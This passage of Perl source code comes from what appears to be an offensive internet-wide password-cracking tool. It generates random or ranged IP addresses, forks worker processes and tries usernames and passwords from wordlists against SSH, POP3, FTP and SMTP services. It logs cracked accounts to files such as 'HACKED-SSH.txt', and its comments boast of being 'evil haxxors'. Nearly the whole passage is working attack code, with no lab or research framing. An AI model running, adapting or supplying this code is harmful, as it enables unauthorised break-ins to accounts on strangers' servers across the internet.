			$current_ip = $first_octet.'.'.$second_octet.'.'.$third_octet.'.'.$fourth_octet;
			print "\n Current_ip: $current_ip \t Last_ip: $last_ip	(Third octet UNTIL loop)";
			$remote_host = $current_ip;
			HackMaster();
			until($fourth_octet == 255 || $current_ip eq $last_ip )	{
				$fourth_octet++;
				$current_ip = $first_octet.'.'.$second_octet.'.'.$third_octet.'.'.$fourth_octet;
				print "\n Current_ip: $current_ip \t Last_ip: $last_ip (Fourth octet UNTIL loop)";
				$remote_host = $current_ip;
				HackMaster();
			}
			$fourth_octet = 0;
		}
	}
	elsif ($fourth_octet < $ip_array_two[3])	{
		print "this uses one out of four octets!";
		# Kludge so that I can print out the first and last ips:
		until ($fourth_octet == ($ip_array_two[3]+1) )	{
			print "\n Current IP: $current_ip ";
			$remote_host = $current_ip;
			HackMaster();
			$fourth_octet++;
			$current_ip = $first_octet.'.'.$second_octet.'.'.$third_octet.'.'.$fourth_octet;
		}
	}
	print "\n  ****************************   RANGE_GEN SUBROUTINE FINISHED ************************\n";
}


#################################  RANDOM_IP ################################################

###### N.B. this subroutine NEVER ENDS! (much like a Conservative government) ####


sub random_ip	{

	my $first_octet;
	my $second_octet;
	my $third_octet;
	my $fourth_octet;
	my $procid;
	my $terminated_processes = 0;
	my $exitstatus = 0;
	my $wait_times = 0;
	my @ip_digits;
	my $random_ip;
	
	print "\n *********** ENTERED RANDOM_IP SUBROUTINE ****************";
	unless ($ip_input eq "undefined")	{
		print "\n";
		print "ip input:$ip_input";
		print "\n\n\n";
		@ip_digits = split(/\./, $ip_input);
		$first_octet = @ip_digits[0];
		if (@ip_digits[1]) {$second_octet = @ip_digits[1];}
		print "\n";
		print "first_octet:$first_octet\n";
		print "second octet:$second_octet\n";
		print "\n";
	}
	print "\n";
	print "Initial processing concluded.";
	print "\n";

	until ($first_octet == 256)	{		# INFINITE LOOP STARTS ($first_octet will NEVER be 256)
		if ($forktimes > 0)	{
			$wait_times = $forktimes;	
			until ($forkcount == $forktimes)	{
				print "\n  *** Forking.... *** \n";
				$forkcount++;
				print "\n forkcount:$forkcount     times_looped:$times_looped     ips generated:$ips_generated \n";
				$procid = fork();
			if ($procid)	{
				print "\n ***********************************************************************\n";
				print "\n *** This is the parent process, procid:$procid, forkcount:$forkcount ***\n";
				print "\n ***********************************************************************\n";
			}
			elsif ($procid == 0)	{
				print "\n This is the child  process. \n";	
				print "\n forkcount:$forkcount     times_looped:$times_looped     ips generated:$ips_generated \n";
				srand();
				if ($ip_input eq "undefined") {
					$first_octet = int(rand(256));
					if ($first_octet == 127)	{
						until ($first_octet != 127)	{		# Stop it connecting to localhost!
							print " ****** FUCKING THING GENERATED A LOCALHOST IP, RETRYING *******";
							$first_octet = int(rand(256));
						}
					}
				}
				
				unless ($ip_digits[1]) {$second_octet = int(rand(256));}
				$third_octet = int(rand(256));
				$fourth_octet = int(rand(256));
				$random_ip = $first_octet.'.'.$second_octet.'.'.$third_octet.'.'.$fourth_octet;
				print "\n****************************\n*random_ip:$random_ip*\n****************************\n";
				print "\n Forkcount:$forkcount times_looped:$times_looped IPs Generated:$ips_generated Random IP: $random_ip \n";
				if (
				($username_option =~ '-user:'||$username_option =~'-userblank')
				 &&
				($password_option =~ '-pass:'|| 
				$password_option =~'-passblank' ||
				$scantype eq "SMTP" || $scantype eq "smtp")
				 ||
				($scantype eq "CUSTOM" || 
				$scantype eq "Custom" || 
				$scantype eq "custom" || 
				$scantype eq "BANNER" || 
				$scantype eq "Banner" || 
				$scantype eq "banner" || 
				$scantype eq "searchopen" || 
				$scantype eq "Searchopen" || 
				$scantype eq "SEARCHOPEN" || 
				$scantype eq "udp" || 
				$scantype eq "UDP" 
				)
				)	{
					$remote_host = $random_ip;
					HackMaster();		
				}
				
		
				####  Get Passwords From File ###########
				elsif (($username_option =~ '-user:'||$username_option eq "-userblank")
				 && 
				 $password_option =~ '-passfile:')	{
			
					PasswordsFromFile($random_ip);
			
				}	# Close ELSIF block for multiple-password attempts
		

		
				##### Get Usernames From File	############
		
				elsif ($username_option =~ '-userfile:' 
				 &&
				 ($password_option =~ '-pass:'||
				 $password_option =~'-passblank' ||
				 $scantype eq "smtp" || 
				 $scantype eq "SMTP")
				 &&
				 $ip_option =~ '-random_ip')	{
					
					UsernamesFromFile($random_ip);
		
				}	# Close ELSIF block for multiple-username attempts

		
				elsif ($username_option =~ '-userfile:' && $password_option =~ '-passfile:'
				 &&
				 $ip_option =~ '-random_ip')	{
			 
					UsernamesAndPasswordsFromFile($random_ip);

				}	# Close ELSIF block that chooses userfile AND password file mode
		


				else {
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					print "\n**** ERROR!!! OUT OF OPTIONS IN random_ip(), PRESS CTRL-C!!! ******";
					exit(); # Screen will be scrolling rapidly hence the large number of messages
				}			# The idea is to catch the users attention before it scrolls off
				statistics();
				print "\n";
				print "               FINISHING FORKED PROCESS";
				print "\n";
				$exitstatus = exit();				
				print "\n ********************************\n EXIT STATUS: $exitstatus \n ******************************** \n";	
			} # Close "elsif procid" block 
			else {
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
				print "\n ############################ Oh shit couldn't fork!!! ###########################";
			} # Warn if process error. Don't want warning scrolling off the screen unnoticed!
		}	# Continue forking    

		print "\n wait_times:$wait_times ";
		until ($wait_times == 0)	{			# Reaps any leftover zombies 
			print "\n";
			print "Going into wait().... uptime: $uptime seconds";
			print "\n";
			wait();								# (well, waits for them to die technically)
			$terminated_processes = $?;
			$wait_times--;
			print "\n **************************************************************************\n";
			print " *** \t TERMINATED w/code $terminated_processes.  $wait_times left. IPs generated:$ips_generated \t ***";
			statistics();
			print " **************************************************************************\n";
		}
		$times_looped++;	# When multitasking the times_looped increment lives here!
	}	# Closes "	if ($forktimes > 0)" block 

############################### SINGLE TASK MODE ###############################

	else	{
		print "\n Single-task mode, not forking... \n";
		#if ($ip_input eq "undefined") {$first_octet = int(rand(256));}
		if ($ip_input eq "undefined") {
			$first_octet = int(rand(256));
			if ($first_octet == 127)	{
				until ($first_octet != 127)	{		# Stop it connecting to localhost!
					print " ****** FUCKING THING GENERATED A LOCALHOST IP, RETRYING *******";
					$first_octet = int(rand(256));
				}
			}
		}
		unless ($ip_digits[1]) {$second_octet = int(rand(256));}
		$third_octet = int(rand(256));
		$fourth_octet = int(rand(256));
		my $random_ip = $first_octet.'.'.$second_octet.'.'.$third_octet.'.'.$fourth_octet;
		print "\n IPs generated / times_looped:$times_looped Random IP is $random_ip \n";
		if ($username_option =~ '-user:' &&
		($password_option =~ '-pass:'|| $password_option =~'-passblank'	|| 
		 $scantype eq "SMTP" || 
		 $scantype eq "smtp") || 
		$scantype eq "CUSTOM" || 
		$scantype eq "Custom" || 
		$scantype eq "custom" || 
		
		$scantype eq "banner" || 
		$scantype eq "Banner" || 
		$scantype eq "BANNER" || 
		$scantype eq "udp" || 
		$scantype eq "UDP" || 
		$scantype eq "searchopen" || 
		$scantype eq "Searchopen" || 
		$scantype eq "SEARCHOPEN"
		 )	{
			$remote_host = $random_ip;
			HackMaster();		
		}
		
		####  Get Passwords From File ###########
		elsif (($username_option =~ '-user:'||$username_option eq "-userblank")
		&& 
		$password_option =~ '-passfile:')	{
			
			PasswordsFromFile($random_ip);
			
		}	# Close ELSIF block for multiple-password attempts
		

		
		##### Get Usernames From File	############
		
		elsif ($username_option =~ '-userfile:' 
		&&
		($password_option =~ '-pass:'||
		$password_option =~'-passblank' ||
		$scantype eq "smtp" || 
		$scantype eq "SMTP")
		&&
		$ip_option =~ '-random_ip')	{
			
			UsernamesFromFile($random_ip);

		}	# Close ELSIF block for multiple-username attempts

		
		elsif ($username_option =~ '-userfile:' && $password_option =~ '-passfile:'
		 &&
		 $ip_option =~ '-random_ip')	{
			 
			 UsernamesAndPasswordsFromFile($random_ip);

		}	# Close ELSIF block that chooses userfile AND password file mode
	
		else {die "\n\n Don't know what went wrong here! crashed after failing to select a mode for random_ip \n\n";}

	}	# Close second-last ELSE block (the one that chooses single-task mode)

	$forkcount = 0;
	statistics();
	print "\n ***** RANDOM_IP subroutine finished *** $ips_generated IPs generated **** \n";

	}	# Close infinite UNTIL loop
}	# Close subroutine


############################## PASSWORDSFROMFILE #######################################

# Note to smartarses: I know the ($random_ip, @_) bit isn't strictly neccesary for the 
# PERL interpreter, and that the actual movement of variables happens with the 
# my $random_ip = shift; 
# line. But it's not there for the PERL interpreter. It's there
# for us - so we can see at a glance which variable it expects.
#

sub PasswordsFromFile ($random_ip, @_)	{
	
	my $random_ip = shift;
	
	$remote_host = $random_ip;
	print "\n Now to search for username $username trying passwords from file $passfile \n";
	print "\n The IP option is $ip_option... \n";
	$wordlist_filename = $passfile;
	ReadWordListFile();
	@password_array = @word_array;
	$numofpasswords = scalar @password_array;
	until ($password_count == $numofpasswords ||
	 $port_test eq "FAILED" ||
	 $login_found eq "YES")	{
			print "#\tCurr. password\n";
			print "$password_count\t$password_array[$password_count]";
			$password = "$password_array[$password_count]";
			print "\n username is $username, password is $password, ready to crack! \n";
			HackMaster();
			$password_count++;
	}# Close this UNTIL loop
	print "Got out of UNTIL loop, re-setting variables....";
	undef $port_test;
	undef $login_found;
	$password_count = 0;
	print "back into the fray with another random number!....";	
}



############################## USERNAMESFROMFILE #######################################

sub UsernamesFromFile ($random_ip, @_)	{

	my $random_ip = shift;

	$remote_host = $random_ip;
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_input is $ip_input";
	print "\n Processing usernames from $userfile with a single password in random mode\n";
	$wordlist_filename = $userfile;
	ReadWordListFile();
	@username_array = @word_array;
	$numofusernames = scalar @username_array;	# Changed from scalar scalar @username_array- think that was a bug!
	until ($username_count == $numofusernames ||
	 $port_test eq "FAILED" ||
	 $login_found eq "YES")	{
		print "#\tCurr. word\n";
		print "$username_count\t$username_array[$username_count]";
		$username = "$username_array[$username_count]";
		print "\n username is $username, password is $password, ready to crack! \n";
		HackMaster();
		$username_count++;
	} # Close of username UNTIL loop
	print "Got out of UNTIL loop, re-setting variables....";
	undef $port_test;
	undef $login_found;
	$username_count = 0;
	print "back into the fray with another random number!....";
				
	
}


############################## USERNAMESANDPASSWORDSFROMFILE ##############################

sub UsernamesAndPasswordsFromFile ($random_ip, @_)	{

	my $random_ip = shift;
			
	$remote_host = $random_ip;
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_input is $ip_input";
	print "\n Processing usernames from $userfile and passwords from $passfile in random mode\n";
	print "\n\n";
	$wordlist_filename = $userfile;
	ReadWordListFile();
	@username_array = @word_array;
	$numofusernames = scalar @username_array;
	print "\n username_count:$username_count numofusernames:$numofusernames";
	until ($username_count == $numofusernames ||
	  $port_test eq "FAILED" ||
	  $login_found eq "YES")	{
		print "#\tCurr. username\n";
		print "$username_count\t$username_array[$username_count]";
		$username = "$username_array[$username_count]";
		$wordlist_filename = $passfile;
		ReadWordListFile();
		@password_array = @word_array;
		$numofpasswords = scalar @password_array;
		print "\n password_count:$password_count numofpasswords:$numofpasswords";
		until ($password_count == $numofpasswords||
		 $port_test eq "FAILED" ||
		 $login_found eq "YES")	{
			print "#\tCurr. password\n";
			print "$password_count\t$password_array[$password_count]";
			$password = "$password_array[$password_count]";
			print "\n username is $username, password is $password, ready to crack! \n";		
			HackMaster();
			$password_count++;
		}	# Close second UNTIl loop (the password_count one)

		print "\n Got out of second UNTIL loop, resetting password_count...";
		$password_count = 0;	
		$username_count++;
			
	}	# Close first UNTIL loop (the username_count one)
	print "\n";		
	print "Got out of double UNTIL loop, re-setting all variables....";
	undef $port_test;
	undef $login_found;
	$password_count = 0;				
	$username_count = 0;
	print "back into the fray with another random number!....";			

}



######################################### ERROR_CORRECT ###################################
sub error_correct	{

	# because error_correct is called recursively, it has to be prevented from calling itsself,
	# hence the use of a "running_error_correct" variable

	unless ($running_error_correct eq 'YES')	{
		$running_error_correct = 'YES';		
		until ($conn_error eq "no" or $retry == $max_retries)	{
			$retry++;
			print "\n Retries: $retry \n";
			HackMaster();
		}
		if ($conn_error eq "yes" && $debug )	{
			print "\n## Out of retries: $remote_host $remote_port User: $username Passwd: $password | $! ##\n";
			$filename = "out-of-retries.txt";
			$verbal_report = "\n# Could never connect to $remote_host on port $remote_port despite $retry retries. Uname:$username Passwd:$password Scantype: $scantype  PID:$$ | $! #\n";
			WriteReportFile();
		}
		$retry = 0;
		$running_error_correct = 'NO';
	}
	else	{print "\n Already running error_correct, skipping..... \n";}
}

########################################## GETWHOISINFO ##################################

sub GetWhoIsInfo	{


	if ($whois_option eq "ON")	{
		print "\n Getting WHOIS info for $remote_host...";
		print "\n";
		$cmd = "echo 'whois $remote_host'  >> whoisreport.txt";
		$shell = `$cmd`;
		$cmd = "whois $remote_host >> whoisreport.txt";
		print "\n Running command:$cmd";
		print "\n (if you're behind a proxy, it may error)\n";
		$shell = `$cmd`;
		$shell = `chmod +666 whoisreport.txt`;	# In case we're running as a Superuser (WHICH WE SHOULD BE)
	}
}


##################################### HackSSH #####################################

# I went with Net::SSH::Expect which uses the onboard SSH util as OpenSSH gave me
# too many  false positives
#
# N.B If you want this to work you MUST Add the following to /etc/ssh/ssh_config
# (without the "#" obvs)
#
#Host * (may already exist)
#
#    StrictHostKeyChecking no
#    UserKnownHostsFile=/dev/null

sub HackSSH	{
	
	
	use Net::SSH::Expect; 	
	
	my @searchresult;
	## ssh error correcting bullshit ##

	our $dollarat = "undefined";

	### ssh stuff ###

	my $sshsesh = "undefined";
	my $SSH_error = "SSH error-undefined";
	my $login_output;
	my $catch_conn_err;

	print "\n HackSSH: Connecting to $remote_host on port $remote_port with user $username and password $password";
	print "\n\n";

	$catch_conn_err = eval { 
		$sshsesh = Net::SSH::Expect->new (
		host => $remote_host,
		port => $remote_port,
		user => $username,
		password => $password,
		raw_pty => 1,
		timeout => $timeout,
		restart_timeout_upon_receive => 1)
	};

	if ($@)	{
		$SSH_error = $@;
		$reply = "(not applicable)";
		print "Caught connection error! SSH_error = $SSH_error ";
		$conn_error = "yes";
		if ($logall eq "ON")	{
 			$addenda = "Banal error: Doesn't connect at all. ";
 			$addenda .= "\n # Eval error:$@# System error:$!#";
 			$addenda .= "\n # catch_conn_err:$catch_conn_err#";
			$filename = "errors.txt";
			WriteScrewupReport();
		}		
	}
	else {
		print "\n Connected OK. Transmitting username $username and password $password to $remote_host on port $remote_port";
		print "\n";
		$catch_conn_err = eval { $login_output = $sshsesh->login()};
		print "\n";
		print "Sent login command....";
		print "\n";
		if ($@)	{
			print "\n Exception caught! Sent login but no reply. SSH error: $@";
			$SSH_error = $@;
			$reply = "(not applicable)";
			$conn_error = "yes";			
			if ($logall eq "ON")	{
				$addenda = "Banal error: Connected, sent login, but no reply.";
				$addenda .= "\n # Eval error:$@# System error:$!#";
				$addenda .= "\n # catch_conn_err:$catch_conn_err#";
				$filename = "errors.txt";
				WriteScrewupReport();
			}
		}
		else {
			print "\n";
			print "Login output is...$login_output.";
			$reply = $login_output;

			## As you can see I had real problems with this POS.
			# If you're having troubles with this, this is the problem.
			# When I get it a bad password, my SSH server kept giving
			# me weird-ass error messages alternating between
			#  "Permission denied, please try again"
			# followed by a password prompt, and what looked like 
			# sweet F.A. but was actually a space followed by a newline.

#			if (@searchresult = $login_output =~ /(Permission denied)/s or
#			@searchresult = $login_output eq /( \n)/s or
#			@searchresult = $login_output =~ /(rong password)/s or
#			@searchresult = $login_output =~ /(ogin incorrect)/s or
#			@searchresult = $login_output eq /( \nPassword:)/s or
#			@searchresult = $login_output eq /(\nPassword:)/s or
#			@searchresult = $login_output eq /( \nPassword: )/s or
#			@searchresult = $login_output eq /( \nLocal password authentication for root\nPassword: )/s or
#			@searchresult = $login_output =~ /(uthentication refused)/s or
#			@searchresult = $login_output =~ /(\*\*\nlogin: )/s or
#			@searchresult = $login_output =~ /(password is wrong)/s or
#			@searchresult = $login_output =~ /(assword for )/s)	{

			if ($login_output =~ /:~\$/s ||
			$login_output =~ /~/s ||
			$login_output =~ /elcome to/s ||
			$login_output =~ /elcome To/s ||
			$login_output =~ />/s ||
			$login_output =~ /#/s ||
			$login_output =~ /ain menu/s ||
			$login_output =~ /ain Menu/s) {		 
				####### YAAAY SUCCESSSS!!!! ######
				$addenda = "Congratulations! We seem to have found a valid SSH account!";
				$addenda .= "\n # Eval error:$@# System error:$!#";
				PrintSuccessHack();
				$filename = "HACKED-SSH.txt";
				WriteCorrectPasswordReport();
				$conn_error = "no";
			}	######### / SUCCESSS!!!! #########

			elsif (@searchresult = $login_output =~ /(Permission denied)/s or
			@searchresult = $login_output eq /( \n)/s or
			@searchresult = $login_output =~ /(rong password)/s or
			@searchresult = $login_output =~ /(ogin incorrect)/s or
			@searchresult = $login_output eq /( \nPassword:)/s or
			@searchresult = $login_output eq /(\nPassword:)/s or
			@searchresult = $login_output eq /( \nPassword: )/s or
			@searchresult = $login_output eq /( \nLocal password authentication for root\nPassword: )/s or
			@searchresult = $login_output =~ /(uthentication refused)/s or
			@searchresult = $login_output =~ /(\*\*\nlogin: )/s or
			@searchresult = $login_output =~ /(password is wrong)/s or
			@searchresult = $login_output =~ /(assword for )/s)	{
				print "\n Well, looks like $password was the wrong password.";
				$addenda = "Wrong username / password!";
				$addenda .= "\n # Eval error:$@# System error:$!#";
				$filename = "SSHwrongpasswords.txt";	
				WriteWrongPasswordReport();
				$conn_error = "no";
			}
			elsif ($login_output =~ "imeout")	{
				print "Well, looks like we screwed up.";
				$addenda = "Looks like a timeout snafu...";
				$addenda .= "\n # Eval error:$@# System error:$!#";
				$filename = "errors.txt";
				WriteScrewupReport();
				$conn_error = "yes";
			}
						
			else {
				print "Badly defined reply- might be good, might not...";
				$verbal_report = "\n ###################################################################";
				$verbal_report .= "\n # POSSIBLE SSH login found. Don't get your hopes up though.      #";
				$verbal_report .= "\n ** UPTIME:$minutesup mins * IPS/MIN:$ipspermin * Conn. attempts: $times_looped **";
				$verbal_report .= "\n #           Host: $remote_host Port: $remote_port                #";
				$verbal_report .= "\n # Tried username: $username Tried password: $password        #";
				$verbal_report .= "\n # Reply from server:\n$reply \n";
				$verbal_report .= "\n # Eval error:$@# System error:$!#";
				$verbal_report .= "\n ###################################################################";
				$verbal_report .= "\n";
				print $verbal_report;
				$filename = "SSH-MAYBES.txt";
				WriteReportFile();
				$conn_error = "no";
			}
		}
	
	}
	print "\n\n\n";
}


################################## HACKPOP3 ####################################

sub HackPOP3	{


	use Net::POP3;

	my $pop3_client;
	my $pop3_login_result;
	my $pop3_message;

	if ($pop3_client = Net::POP3->new(
	Host => $remote_host,
	Port => $remote_port,
	Debug => 255,
	Timeout => $timeout))	{
		$pop3_login_result = $pop3_client->login($username, $password);
		
		if ($pop3_login_result)	{
			######## YAAAY SUCCESS!!!! ######
			$conn_error = "no";
			$addenda = "Congratulations! We seem to have found a valid POP3 account!";
			$addenda .= "\n # pop3_login_result: $pop3_login_result";
			$pop3_message = $pop3_client->message;
			$addenda .= "\n # pop3_message: $pop3_message";
			PrintSuccessHack();
			print "\n $addenda";
			$filename = "HACKED-POP3.txt";
			WriteCorrectPasswordReport();
			GetWhoIsInfo();
			return;
			######### /SUCCESS!! #############			
		}
	else	{	# If it can't log in it's probably a bad password...
			print "\n Couldn't log in.";
			$pop3_message = $pop3_client->message;
			if ($pop3_message)	{
				$conn_error = "no";
				print "\n pop3_message: $pop3_message";	#'Login incorrect.' means didn't log in
				#print "\n pop3_login_result:\n$pop3_login_result";
				print "\n Error message from server, wrong password. \n";
				$filename = "POP3wrongpasswords.txt";
				$addenda = "Message from POP3 server:$pop3_message";
				WriteWrongPasswordReport();
				return;
			}
			
			else	{	# If it can't get a POP3 message somethings REALLY wrong!
				$addenda = "EPIC ERROR - COULDN'T GET MESSAGE FROM POP3 SERVER";
				$addenda .= "\n # Eval error:$@ ** System error:$!";
				print "\n $addenda";
				$filename = "errors.txt";
				WriteScrewUpReport();
				$conn_error = "yes";
				print "\n\n";
				return;
			}
			
		}	# Closes "can't log in" bracket
	}	# Closes "if (pop3 client..."  bracket

	else	{	# If it can't even get as far as logging in it's probably a boring old error, try again
		print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
		print "##### Username was $username and password was $password  #### \n";
		$conn_error = "yes";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all or timed out trying to connect.";
			$addenda .= "\n # Eval error:$@ ** System error:$!";
			$filename = "errors.txt";
			WriteScrewupReport();
		}	# Closes logall bracket
	}	# Closes can't connect bracket				
}


########################### HACKFTP ###################################

sub HackFTP	{

use Net::FTP;

my $ftp_client;
my $ftp_login_result;
my $ftp_message;

	if ($ftp_client = Net::FTP->new(
	Host => $remote_host,
	Port => $remote_port,
	Debug => 255,
	Timeout => $timeout))	{
		
		$ftp_login_result = $ftp_client->login($username, $password);

		if ($ftp_login_result)	{
			######## YAAAY SUCCESS!!!! ######
			$conn_error = "no";
			$addenda = "Congratulations! We seem to have found a valid FTP account!";
			$addenda .= "\n # ftp_login_result: $ftp_login_result";
			$ftp_message = $ftp_client->message;
			$addenda .= "\n # ftp_message: $ftp_message";
			PrintSuccessHack();
			print "\n $addenda";
			$filename = "HACKED-FTP.txt";
			WriteCorrectPasswordReport();
			GetWhoIsInfo();
			return;
			######### /SUCCESS!! #############
		}
		else	{	# If it can't log in it's probably a bad password...
			print "\n Couldn't log in.";
			$ftp_message = $ftp_client->message;
			if ($ftp_message)	{
				$conn_error = "no";
				print "\n ftp_message: $ftp_message";	#'Login incorrect.' means didn't log in
				#print "\n ftp_login_result:\n$ftp_login_result";
				print "\n Error message from server, wrong password. \n";
				$filename = "FTPwrongpasswords.txt";
				$addenda = "Message from FTP server:$ftp_message";
				WriteWrongPasswordReport();
				return;
			}
			else	{	# If it can't get an FTP message somethings REALLY wrong!
				$addenda = "EPIC ERROR - COULDN'T GET MESSAGE FROM FTP SERVER";
				$addenda .= "\n # Eval error:$@ ** System error:$!";
				print "\n $addenda";
				$filename = "errors.txt";
				WriteScrewUpReport();
				$conn_error = "yes";
				print "\n\n";
				return;
			}
		}	# Closes "can't log in" bracket
	}	# Closes "if (ftp client..."  bracket

	else	{	# If it can't even get as far as logging in it's probably a boring old error, try again
		print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
		print "##### Username was $username and password was $password  #### \n";
		$conn_error = "yes";
		if ($logall eq "ON")	{
			$addenda = "Banal error: Doesn't connect at all or timed out trying to connect.";
			$addenda .= "\n # Eval error:$@ ** System error:$!";
			$filename = "errors.txt";
			WriteScrewupReport();
		}	# Closes logall bracket
	}	# Closes can't connect bracket
}


#################################### HACKSMTP ###################################
#


sub HackSMTP()	{
	
	use IO::Socket::INET;
	use IO::Socket::Timeout;

	
	my $smtploop = 1;
	my $smtp_code;
	
	use Errno qw(ETIMEDOUT EWOULDBLOCK);

	print "\n HackSMTP: Hacking $remote_host on port $remote_port with command $usernamelogon";
	print "\n";
	if ($socket = IO::Socket::INET->new 
	(PeerAddr => $remote_host,
	PeerPort => $remote_port,
	Proto => $protocol,
	Type => SOCK_STREAM,
	Timeout => $timeout))	{
		print "\n";
		print "Setting up timeout....";
		IO::Socket::Timeout->enable_timeouts_on($socket);
		$socket->read_timeout($timeout);
		$socket->write_timeout($timeout);
		
	#	do some naughty things
		print "\n ** Retry: $retry conn_error: $conn_error ** \n";
		print "\n Socket:";
		print "\n";
		$reply = <$socket>;
		#if (! $reply && ( 0+$! == ETIMEDOUT || 0+$! == EWOULDBLOCK )) {		
		if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
			$addenda = "Timed out while still connected, will re-try if possible...";
			$conn_error = "yes";
			$filename = "errors.txt";
			WriteScrewupReport();
		}
		print "\n reply is \n";
		print $reply;
		if ($reply eq '')	{
			print "## Reply not defined - probably a timeout bug?? Retrying...## ";
			print "##### Couldn't connect to $remote_host $remote_port | $! #### \n";
			$conn_error = "yes";
			if ($logall eq "ON")	{
				$addenda = "Banal error: Connects but server won't talk- too many connections to server?";
				$filename = "errors.txt";
				WriteScrewupReport();
			}
			close ($socket);
			return;
		}
		
		$banner = $reply;
		$smtp_code = substr ($reply,0,3);
		print "SMTP error code: $smtp_code";
		unless ($smtp_code eq "200" || $smtp_code eq "250" || $smtp_code eq "220" || $smtp_code eq "211")	{
			print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
			print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
			print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
			print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
			$filename = "errors.txt";
			$addenda = "SMTP reply / error code: $smtp_code";
			WriteScrewupReport();
			$conn_error = "no";
		}
		###################### SEND HELO COMMAND #################
		else	{
			print "\n Sending HELO... \n";
			print $socket "helo gmail.com\n";
			$reply = <$socket>;
			if (! $reply && ( $! == ETIMEDOUT || $! == EWOULDBLOCK )) {		
				$addenda = "Timed out while still connected, will re-try if possible...";
				$conn_error = "yes";
				$filename = "errors.txt";
				WriteScrewupReport();
			}
			print "\n Reply is:";
			print $reply;
			$smtp_code = substr ($reply,0,3);
			print "SMTP error code: $smtp_code";
			unless ($smtp_code eq "200" || $smtp_code eq "250" || $smtp_code eq "220" || $smtp_code eq "211")	{
				print "### Proxy might have hit a blacklist or couldn't look me up cos we're evil haxxors ###";
